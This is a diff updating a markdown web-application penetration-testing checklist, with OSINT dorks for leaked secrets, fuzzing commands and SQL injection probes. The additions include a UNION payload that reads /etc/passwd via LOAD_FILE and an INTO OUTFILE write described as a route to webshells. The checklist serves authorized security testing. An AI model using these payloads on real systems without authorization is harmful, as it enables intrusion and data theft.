@@ -1,9 +1,5 @@
-# 🛡️ Web Application Blackbox / Greybox VAPT Checklist
+# 🛡️ Web Application Blackbox & Greybox VAPT Checklist
 
-> **Version:** 2.0 | **Last Updated:** 2025 | **Standard:** OWASP Testing Guide v4.2 / WSTG
->
-> **Scope:** Blackbox & Greybox Web Application Penetration Testing
->
 > **Disclaimer:** This checklist is intended for **authorized security professionals only**. Unauthorized testing is illegal. Always obtain written permission before testing.
 
 ---
@@ -35,8 +31,8 @@
 
 ### 1.1 Scope Definition
 
-- [ ] Obtain written authorization / Rules of Engagement (RoE) document
-- [ ] Define in-scope domains, IPs, endpoints
+- [ ] Obtain written authorization / Rules of Engagement (RoE) document, NDAs etc.
+- [ ] Define in-scope domains, IPs, endpoints using a scoping document.
 - [ ] Define out-of-scope assets (e.g., third-party services, payment gateways)
 - [ ] Confirm testing window and blackout periods
 - [ ] Confirm point of contact (SPOC) for emergencies
@@ -74,15 +70,22 @@ nuclei -update-templates
 
 ### 2.1 Passive Reconnaissance (OSINT)
 
-- [ ] Search for subdomains via certificate transparency logs
 - [ ] Google Dork the target
-- [ ] Check Wayback Machine for old endpoints
-- [ ] Search Shodan / Censys for exposed ports and banners
-- [ ] Check GitHub / GitLab for leaked secrets, source code, config files
-- [ ] Check `robots.txt`, `sitemap.xml`, `.well-known/`
-- [ ] Look for exposed `.git`, `.svn`, `.env`, `backup.zip` files
-- [ ] Check job postings for technology stack clues
+```
+site:target.com ext:php | ext:asp | ext:aspx | ext:jsp
+site:target.com inurl:admin | inurl:login | inurl:upload
+site:target.com filetype:pdf | filetype:xlsx | filetype:docx
+"target.com" inurl:".git" OR ".env" OR "backup"
+```
 
+- [ ] Check Wayback Machine for old endpoints
+```bash
+# Wayback Machine
+gau target.com --mc 200 --o gau_urls.txt
+waybackurls target.com | tee wayback.txt
+```
+
+- [ ] Search for subdomains via certificate transparency logs
 ```bash
 # Subdomain enumeration via cert transparency
 subfinder -d target.com -all -recursive -o subdomains.txt
@@ -93,75 +96,102 @@ curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq '.[].name_value' | s
 
 # BBOT (2025 recommended workflow)
 bbot -t target.com -p subdomain-enum cloud-enum email-enum spider
+```
 
-# Wayback Machine
-gau target.com --mc 200 --o gau_urls.txt
-waybackurls target.com | tee wayback.txt
+- [ ] Search Shodan / Censys for exposed ports and banners
+```bash
+# Shodan
+shodan search "hostname:target.com"
+shodan search "ssl.cert.subject.cn:target.com"
+```
 
-# Google Dorks
-# site:target.com ext:php | ext:asp | ext:aspx | ext:jsp
-# site:target.com inurl:admin | inurl:login | inurl:upload
-# site:target.com filetype:pdf | filetype:xlsx | filetype:docx
-# "target.com" inurl:".git" OR ".env" OR "backup"
-
+- [ ] Check GitHub / GitLab for leaked secrets, source code, config files
+```
 # GitHub dorking
 # org:target filename:.env
 # "target.com" DB_PASSWORD
 # "target.com" secret_key
+```
 
-# Shodan
-shodan search "hostname:target.com"
-shodan search "ssl.cert.subject.cn:target.com"
 
+- [ ] Check `robots.txt`, `sitemap.xml`, `.well-known/`
+```bash
 # Check common sensitive files
 for f in robots.txt sitemap.xml .git/HEAD .env web.config crossdomain.xml phpinfo.php; do
   curl -so /dev/null -w "%{http_code} $f\n" https://target.com/$f
 done
 ```
+- [ ] Look for exposed `.git`, `.svn`, `.env`, `backup.zip` files
+- [ ] Check job postings for technology stack clues
+
 
 ### 2.2 Active Footprinting
 
 - [ ] Identify web server (Apache, Nginx, IIS, Tomcat, etc.)
-- [ ] Identify backend technology (PHP, ASP.NET, Java, Node.js, Python)
-- [ ] Identify WAF / CDN (Cloudflare, Akamai, Imperva, AWS WAF)
-- [ ] Identify frameworks (WordPress, Laravel, Spring, Django, etc.)
-- [ ] Map third-party integrations (payment, analytics, chat widgets)
-
 ```bash
 # Web server / technology fingerprinting
 whatweb -a 3 https://target.com
 curl -I https://target.com  # Check Server, X-Powered-By headers
+```
 
+- [ ] Identify backend technology (PHP, ASP.NET, Java, Node.js, Python)
+
+```bash
+# Technology stack via Wappalyzer CLI
+wappalyzer https://target.com
+```
+
+**Note**: Look for outdated components, as those can be vulnerabile.
+
+- [ ] Identify WAF / CDN (Cloudflare, Akamai, Imperva, AWS WAF)
+```bash
 # WAF detection
 wafw00f https://target.com
+```
 
+**WARN**: `wafw00f` detects the WAF by sending malicious request probes to the application. WAFs may lockout the IP for some duration because of this. 
+
+- [ ] Identify frameworks (WordPress, Laravel, Spring, Django, etc.)
+- [ ] Map third-party integrations (payment, analytics, chat widgets)
+
+```bash
 # CMS detection
 wpscan --url https://target.com --enumerate ap,at,cb,dbe  # WordPress
 droopescan scan drupal -u https://target.com              # Drupal
 joomscan -u https://target.com                            # Joomla
-
-# Technology stack via Wappalyzer CLI
-wappalyzer https://target.com
 
 # Favicon hash to identify framework
 python3 -c "import requests, mmh3, base64; r=requests.get('https://target.com/favicon.ico'); print(mmh3.hash(base64.encodebytes(r.content)))"
 # Search hash on Shodan: http.favicon.hash:<hash>
 ```
 
+
 ### 2.3 DNS & Network Mapping
 
 - [ ] Full DNS enumeration (A, MX, TXT, CNAME, NS records)
-- [ ] Zone transfer attempt
+```bash
+# DNS enumeration
+dnsx -d target.com -a -aaaa -cname -mx -txt -ns -resp -o dns_records.txt
+```
+
+- [ ] DNS Zone transfer attempt
+```bash
+# Automatic DNS Zone transfer using:
+dnsenum zonetransfer.me
+
+# Step 1:  Get all DNS name servers of the target domain:
+dig ns <target domain>
+
+#Step 2: Check if NS allows zone transfers
+dig axfr @<domain of name server> <target domain> 
+
+Eg : dig axfr @ns1.target.com target.com 
+```
+
 - [ ] Reverse DNS lookups
 - [ ] Identify CDN bypass / real IP
 
 ```bash
-# DNS enumeration
-dnsx -d target.com -a -aaaa -cname -mx -txt -ns -resp -o dns_records.txt
-
-# Zone transfer attempt
-dig axfr target.com @ns1.target.com
-
 # Identify real IP behind CDN
 host target.com
 curl -s "https://api.hackertarget.com/hostsearch/?q=target.com"
@@ -192,29 +222,69 @@ nmap -A -T4 target.com
 httpx -l subdomains.txt -sc -title -td -favicon -jarm -asn -ss -jsonl -o httpx.jsonl
 ```
 
+[IANA Service Name and Port Mappings](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml)
+
+Port `0` is a reserved port in TCP/IP networking and is not used in TCP or UDP messages. If anything attempts to bind to port `0` (such as a service), it will bind to the next available port above port `1,024` because port `0` is treated as a "wild card" port.
+
+
 ### 3.2 Directory & File Brute Forcing
 
 - [ ] Enumerate hidden directories
-- [ ] Enumerate hidden files with multiple extensions
-- [ ] Enumerate API endpoints
-- [ ] Check for backup files (`.bak`, `.old`, `.swp`, `~`)
+```
+ffuf -w directory-list-2.3-medium.txt -u http://target.com/FUZZ -ic
+```
 
+- [ ] Identify the application page's extension
+```
+ffuf -w web-extensions.txt -u http://target.com/indexFUZZ -ic
+
+# With extensions
+ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.asp,.aspx,.jsp,.bak,.old,.txt,.xml,.conf,.json -mc 200,301,401,403
+```
+
+Recursive Fuzzing
+```bash
+ffuf -w directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
+```
+**Note**: The `-e` flag only extends the `FUZZ` keyword. So, if your `FUZZ` keyword has an `index` listing, then the flag extends it to be `index.php`. Does not work for any other keywords.
+
+- [ ] Enumerate API endpoints
+```bash
+# API endpoint discovery
+ffuf -u https://target.com/api/FUZZ -w seclists/Discovery/Web-Content/api/api-endpoints.txt  -mc 200,201,204,301,302,400,401,403,405
+```
+
+- [ ] Vhosts Fuzzing
+To scan for VHosts, without manually adding the entire wordlist to our `/etc/hosts`, we will fuzz using the `Host:` header.
+```bash
+ffuf -w Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://example.com:PORT/ -H 'Host: FUZZ.example.com'
+```
+
+- [ ] Parameter Fuzzing
+Parameter Fuzzing using `GET` request
+```bash
+ffuf -w seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM -u http://example.com:PORT/admin.php?PARAM=123 -fs 753
+```
+
+Parameter Fuzzing using `POST` request
+```bash
+ffuf -w seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://example.com:PORT/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs 753
+```
+
+Once you found the parameter names, you can fuzz for the parameter values as well.
+```bash
+ffuf -w ids.txt:FUZZ -u http://example.com:PORT/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 753
+```
+
+- [ ] Check for backup files (`.bak`, `.old`, `.swp`, `~`)
 ```bash
 # Directory brute force with ffuf (fast, recommended)
 ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
   -mc 200,201,301,302,401,403 -t 50 -o ffuf_dirs.json
 
-# With extensions
-ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-  -e .php,.asp,.aspx,.jsp,.bak,.old,.txt,.xml,.conf,.json -mc 200,301,401,403
-
 # Gobuster
 gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
   -x php,asp,aspx,jsp,html,bak -t 50 -o gobuster.txt
-
-# API endpoint discovery
-ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
-  -mc 200,201,204,301,302,400,401,403,405
 
 # Feroxbuster (recursive)
 feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
@@ -228,12 +298,10 @@ feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/r
 nikto -h https://target.com -o nikto_report.html -Format html
 
 # Nuclei (template-based scanner)
-nuclei -u https://target.com -as -t cves/ -t exposures/ -t misconfiguration/ \
-  -t technologies/ -o nuclei_results.txt
+nuclei -u https://target.com -as -t cves/ -t exposures/ -t misconfiguration/ -t technologies/ -o nuclei_results.txt
 
 # Run all templates
-nuclei -u https://target.com -t /root/nuclei-templates/ -severity critical,high,medium \
-  -jsonl -o nuclei_all.jsonl
+nuclei -u https://target.com -t /root/nuclei-templates/ -severity critical,high,medium -jsonl -o nuclei_all.jsonl
 ```
 
 ---
@@ -386,15 +454,6 @@ git clone https://github.com/drwetter/testssl.sh.git && cd testssl.sh
 
 # Save HTML report
 ./testssl.sh --htmlfile testssl_report.html https://target.com
-
-# Scan for specific vulnerabilities
-./testssl.sh --heartbleed target.com        # Heartbleed
-./testssl.sh --poodle target.com            # POODLE
-./testssl.sh --beast target.com             # BEAST
-./testssl.sh --crime target.com             # CRIME
-./testssl.sh --breach target.com            # BREACH
-./testssl.sh --robot target.com             # ROBOT
-./testssl.sh --sweet32 target.com           # SWEET32
 
 # Check cipher suites
 ./testssl.sh --cipher-per-proto target.com
@@ -708,8 +767,6 @@ python3 domfuzz.py -u "https://target.com/#FUZZ"
 
 ## 8. Phase 7 — SQL Injection
 
-> **Goal:** Manipulate SQL queries to extract data, bypass authentication, or achieve RCE.
-
 | Type | OWASP | CWE | CVE Examples | Exploit-DB |
 |---|---|---|---|---|
 | Error-based SQLi | WSTG-INPV-05, A03:2021 | CWE-89 | CVE-2023-23752 | EDB-51166 |
@@ -727,18 +784,23 @@ python3 domfuzz.py -u "https://target.com/#FUZZ"
 # Manual detection probes (insert into parameter value)
 '
 ''
+#
+;
+)
 `
 ')
 "))
 ' OR '1'='1
-' OR '1'='1'--
-' OR 1=1--
-" OR 1=1--
+' OR '1'='1'-- -
+' OR 1=1-- -
+" OR 1=1-- -
 ' OR 'a'='a
-1' AND SLEEP(5)--
+1' AND SLEEP(5)-- -
 1; WAITFOR DELAY '0:0:5'--   (MSSQL)
 1 AND 1=CONVERT(int,(SELECT @@version))--
 ```
+
+**Note**: In some cases, we may have to use the URL encoded version of the payload.
 
 ### 8.2 Error-Based SQLi
 
@@ -893,6 +955,16 @@ https://target.com/users?username[$gt]=&password[$gt]=
 # Automated tool
 python3 nosqlmap.py --url "https://target.com/login" --attack 2
 ```
+
+- Note that we can also read files using an SQLi vulnerability using the `LOAD_FILE()` functionality, which forms am SQLi leading to LFI.
+```sql
+admin' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+```
+- Some SQIis allow attackers to write files, such as Webshells.
+```sql
+SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+```
+
 
 > 📎 **References:**
 > - [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
